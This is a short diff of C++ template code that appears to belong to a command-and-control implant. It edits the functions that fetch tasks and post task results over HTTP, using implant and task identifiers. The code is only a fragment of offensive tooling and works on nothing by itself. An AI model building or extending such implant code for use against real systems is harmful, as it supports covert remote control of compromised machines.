@@ -38,7 +38,6 @@ nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
     std::string http_response_buffer;
 
-    // Prep metadata as plaintext/unobsfucated
     int registered = SettingsManager::instance().get<int>("registered",0);
     std::vector<uint8_t> metadata_as_msgpack;
 
@@ -168,11 +167,9 @@ nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     return nullptr;
 }
 
-int [[ http_post_function_name ]](std::string implant_uuid, nlohmann::json output_data, std::string task_uuid) {
-    // Prep Payload
-    std::vector<uint8_t> task_response_msgpack;
-    create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);
-    std::string payload(task_response_msgpack.begin(), task_response_msgpack.end());
+int [[ http_post_function_name ]](std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
+    //turn into a string container becuase reasons that I don't remeebr atm
+    std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
 
     // --- Transforms for ID and Output ---
 
